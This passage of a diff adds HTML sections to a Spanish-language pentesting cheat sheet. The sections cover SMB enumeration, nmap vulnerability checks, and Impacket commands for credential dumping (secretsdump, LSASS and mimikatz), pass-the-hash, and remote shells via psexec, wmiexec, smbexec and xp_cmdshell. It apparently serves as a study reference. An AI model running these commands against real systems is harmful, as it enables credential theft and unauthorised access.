+        <div class="cmd-row"><span class="cmd-name">pwd</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Directorio actual.<br><span class="param">pwd</span> print working directory</span></div>
+        <div class="cmd-row"><span class="cmd-name">dir</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Listar archivos (alternativo).<br><span class="param">dir</span> alternativa a ls</span></div>
+        <div class="cmd-row"><span class="cmd-name">mkdir</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Crear directorio.<br><span class="param">mkdir</span> make directory</span></div>
+        <div class="cmd-row"><span class="cmd-name">rmdir</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Eliminar directorio.<br><span class="param">rmdir</span> remove directory</span></div>
+      </div>
+    </div>
+
+    <!-- SMBCLIENT - UPLOAD / DOWNLOAD -->
+    <div class="section" id="tab-smbclient-upload" data-group="smbclient-upload">
+      <div class="cmd-group">
+        <div class="group-title">Upload / Download</div>
+        <div class="cmd-row"><span class="cmd-name">get archivo.txt</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Descargar archivo.<br><span class="param">get</span> descargar</span></div>
+        <div class="cmd-row"><span class="cmd-name">get archivo.txt /local/path</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Descargar a ruta local.<br><span class="param">get</span> + ruta local</span></div>
+        <div class="cmd-row"><span class="cmd-name">put archivo.txt</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Subir archivo.<br><span class="param">put</span> subir</span></div>
+        <div class="cmd-row"><span class="cmd-name">put /local/path/archivo.txt</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Subir desde ruta local.<br><span class="param">put</span> + ruta local</span></div>
+        <div class="cmd-row"><span class="cmd-name">mget *.txt</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Descargar todos los .txt.<br><span class="param">mget</span> multi-get</span></div>
+        <div class="cmd-row"><span class="cmd-name">mput *.txt</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Subir todos los .txt locales.<br><span class="param">mput</span> multi-put</span></div>
+      </div>
+    </div>
+
+    <!-- #################### ENUM4LINUX #################### -->
+    <!-- ENUM4LINUX - BÁSICO -->
+    <div class="section" id="tab-enum4linux-basic" data-group="enum4linux-basic">
+      <div class="cmd-group">
+        <div class="group-title">Enum4linux Básico</div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -a //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumeración completa.<br><span class="param">-a</span> todo</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -U //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Solo usuarios.<br><span class="param">-U</span> usuarios</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -S //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Solo shares.<br><span class="param">-S</span> shares</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -P //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Solo políticas de password.<br><span class="param">-P</span> policies</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -o //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Info del OS.<br><span class="param">-o</span> OS info</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -n //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Nombres de NetBIOS.<br><span class="param">-n</span> NetBIOS names</span></div>
+      </div>
+    </div>
+
+    <!-- ENUM4LINUX - SHARES -->
+    <div class="section" id="tab-enum4linux-shares" data-group="enum4linux-shares">
+      <div class="cmd-group">
+        <div class="group-title">Shares con Credenciales</div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -a -U user%pass //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enum completa con credenciales.<br><span class="param">-a -U</span> todo con auth</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -S -U user%pass //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Shares con autenticación.<br><span class="param">-S -U</span> shares con auth</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -a -u user -p pass //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Formato alternativo user/pass.<br><span class="param">-u -p</span> formato separado</span></div>
+      </div>
+    </div>
+
+    <!-- ENUM4LINUX - POLÍTICAS -->
+    <div class="section" id="tab-enum4linux-policies" data-group="enum4linux-policies">
+      <div class="cmd-group">
+        <div class="group-title">Políticas de Password</div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -P //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Políticas de password.<br><span class="param">-P</span> password policies</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -G //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Políticas de grupo.<br><span class="param">-G</span> group policies</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -C //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Contraseñas de usuario (si accesible).<br><span class="param">-C</span> passwords</span></div>
+      </div>
+    </div>
+
+    <!-- #################### NMAP SMB #################### -->
+    <!-- NMAP - SCRIPTS -->
+    <div class="section" id="tab-nmap-scripts" data-group="nmap-scripts">
+      <div class="cmd-group">
+        <div class="group-title">Nmap SMB Scripts</div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-shares.nse</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumerar shares.<br><span class="param">.nse</span> extensión script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-users.nse</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumerar usuarios.<br><span class="param">smb-enum-users.nse</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-os-discovery.nse</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Descubrir OS.<br><span class="param">smb-os-discovery.nse</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-security-mode.nse</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Modo de seguridad.<br><span class="param">smb-security-mode.nse</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-stat-share.nse</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Estado de shares.<br><span class="param">smb-stat-share.nse</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-shares,smb-enum-users</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Múltiples scripts.<br><span class="param">--script</span> lista separada por comas</span></div>
+      </div>
+    </div>
+
+    <!-- NMAP - VULNS -->
+    <div class="section" id="tab-nmap-vulns" data-group="nmap-vulns">
+      <div class="cmd-group">
+        <div class="group-title">Verificación de Vulns SMB</div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms17-010</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> EternalBlue.<br><span class="param">ms17-010</span> CVE-2017-0144</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms08-067</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> MS08-067.<br><span class="param">ms08-067</span> CVE-2008-4250</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms10-061</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> MS10-061.<br><span class="param">ms10-061</span> Spoolss</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-cve2017-7494</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> SambaCry.<br><span class="param">cve2017-7494</span> Samba CVE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms15-020</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> MS15-020.<br><span class="param">ms15-020</span> CVE-2015-0005</span></div>
+      </div>
+    </div>
+
+    <!-- #################### IMPACKET #################### -->
+    <!-- IMPACKET - SECRETSDUMP -->
+    <div class="section" id="tab-impacket-secrets" data-group="impacket-secrets">
+      <div class="cmd-group">
+        <div class="group-title">SecretsDump</div>
+        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Dump de hashes SAM + LSA.<br><span class="param">user:pass@IP</span> formato de conexión</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Pass-the-Hash.<br><span class="param">-hashes :HASH</span> hash NTLM</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -just-dc-ntlm user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Solo NTLM hashes del DC.<br><span class="param">-just-dc-ntlm</span> solo NTLM</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -just-dc-user admin user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Hash de usuario específico del DC.<br><span class="param">-just-dc-user</span> usuario específico</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -sam sam.save -system system.save -security security.save</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Archivos SAM/SECURITY offline.<br><span class="param">-sam -system -security</span> archivos dump</span></div>
+      </div>
+      <div class="cmd-group">
+        <div class="group-title">LSASS Dump</div>
+        <div class="cmd-row"><span class="cmd-name">procdump -accepteula -ma lsass.exe lsass.dmp</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Dump de lsass.exe con procdump.<br><span class="param">-ma</span> memory dump</span></div>
+        <div class="cmd-row"><span class="cmd-name">mimikatz # sekurlsa::minidump lsass.dmp</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Cargar dump en mimikatz.<br><span class="param">sekurlsa::minidump</span> cargar dump</span></div>
+        <div class="cmd-row"><span class="cmd-name">mimikatz # sekurlsa::logonpasswords</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Extraer credenciales.<br><span class="param">sekurlsa::logonpasswords</span> extraer creds</span></div>
+      </div>
+    </div>
+
+    <!-- IMPACKET - WMIEXEC -->
+    <div class="section" id="tab-impacket-wmi" data-group="impacket-wmi">
+      <div class="cmd-group">
+        <div class="group-title">WMIExec</div>
+        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Shell semi-interactiva via WMI.<br><span class="param">user:pass@IP</span> formato de conexión</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> WMIExec con Pass-the-Hash.<br><span class="param">-hashes :HASH</span> hash NTLM</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec user:pass@IP "whoami"</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Ejecutar comando específico.<br><span class="param">"comando"</span> comando a ejecutar</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -path /tmp user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Directorio de trabajo custom.<br><span class="param">-path</span> directorio de trabajo</span></div>
+      </div>
+    </div>
+
+    <!-- IMPACKET - SMBEXEC -->
+    <div class="section" id="tab-impacket-smb" data-group="impacket-smb">
+      <div class="cmd-group">
+        <div class="group-title">SMBExec</div>
+        <div class="cmd-row"><span class="cmd-name">impacket-smbexec user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Shell semi-interactiva via SMB.<br><span class="param">user:pass@IP</span> formato de conexión</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-smbexec -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> SMBExec con Pass-the-Hash.<br><span class="param">-hashes :HASH</span> hash NTLM</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-smbexec user:pass@IP "net user"</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Ejecutar comando.<br><span class="param">"comando"</span> comando a ejecutar</span></div>
+      </div>
+    </div>
+
+    <!-- IMPACKET - MSSQL -->
+    <div class="section" id="tab-impacket-mssql" data-group="impacket-mssql">
+      <div class="cmd-group">
+        <div class="group-title">MSSQLClient</div>
+        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Conectar a MSSQL.<br><span class="param">user:pass@IP</span> formato de conexión</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient -windows-auth user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Autenticación Windows.<br><span class="param">-windows-auth</span> auth Windows</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient user:pass@IP --enable-xp_cmdshell</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Habilitar xp_cmdshell.<br><span class="param">--enable-xp_cmdshell</span> activar cmd</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient user:pass@IP -c "xp_cmdshell whoami"</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Ejecutar cmd via MSSQL.<br><span class="param">-c</span> comando</span></div>
+      </div>
+    </div>
+
+    <!-- #################### PSEXEC / PASSTHEHASH #################### -->
+    <!-- PSEXEC - PSEXEC -->
+    <div class="section" id="tab-psexec-psexec" data-group="psexec-psexec">
+      <div class="cmd-group">
+        <div class="group-title">PSExec</div>
+        <div class="cmd-row"><span class="cmd-name">impacket-psexec user:pass@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Shell interactiva via SMB.<br><span class="param">user:pass@IP</span> formato de conexión</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-psexec -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> PSExec con Pass-the-Hash.<br><span class="param">-hashes :HASH</span> hash NTLM</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-psexec user:pass@IP "cmd.exe /c whoami"</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Comando específico.<br><span class="param">"cmd.exe /c"</span> ejecutar cmd</span></div>
+        <div class="cmd-row"><span class="cmd-name">psexec.py user:pass@IP -s cmd.exe</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Shell como SYSTEM (-s).<br><span class="param">-s</span> sesión SYSTEM</span></div>
+      </div>
+    </div>
+
+    <!-- PSEXEC - PASS-THE-HASH -->
+    <div class="section" id="tab-psexec-pth" data-group="psexec-pth">
+      <div class="cmd-group">
+        <div class="group-title">Pass-the-Hash</div>
+        <div class="cmd-row"><span class="cmd-name">impacket-psexec -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> PTH con PSExec.<br><span class="param">-hashes</span> formato hash</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> PTH con WMIExec.<br><span class="param">-hashes</span> formato hash</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-smbexec -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> PTH con SMBExec.<br><span class="param">-hashes</span> formato hash</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -hashes :HASH user@IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> PTH con SecretsDump.<br><span class="param">-hashes</span> formato hash</span></div>
+      </div>
+      <div class="cmd-group">
+        <div class="group-title">Formato de Hash</div>
+        <div class="cmd-row"><span class="cmd-name">-hashes :NTLM_HASH</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Formato para Pass-the-Hash.<br><span class="param">:NTLM_HASH</span> solo NTLM</span></div>
+        <div class="cmd-row"><span class="cmd-name">-hashes LM_HASH:NTLM_HASH</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Formato con LM + NTLM.<br><span class="param">LM:NTLM</span> ambos hashes</span></div>
+      </div>
+    </div>
+
+    <!-- PSEXEC - KERBEROS -->
+    <div class="section" id="tab-psexec-kerberos" data-group="psexec-kerberos">
+      <div class="cmd-group">
+        <div class="group-title">Kerberos Authentication</div>
+        <div class="cmd-row"><span class="cmd-name">impacket-psexec -dc-ip DC_IP -k domain/user:pass@target</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Kerberos auth.<br><span class="param">-dc-ip -k</span> Kerberos</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -dc-ip DC_IP -k domain/user:pass@target</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> WMIExec con Kerberos.<br><span class="param">-dc-ip -k</span> Kerberos</span></div>
+        <div class="cmd-row"><span class="cmd-name">export KRB5CCNAME=/tmp/ticket.ccache</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Setear ticket Kerberos.<br><span class="param">KRB5CCNAME</span> variable de entorno</span></div>
+        <div class="cmd-row"><span class="cmd-name">impacket-psexec -k -no-pass domain/user@target</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Usar ticket existente.<br><span class="param">-k -no-pass</span> sin password</span></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!--  JAVASCRIPT: lógica unificada -->
+<script src="../scripts.js"></script>
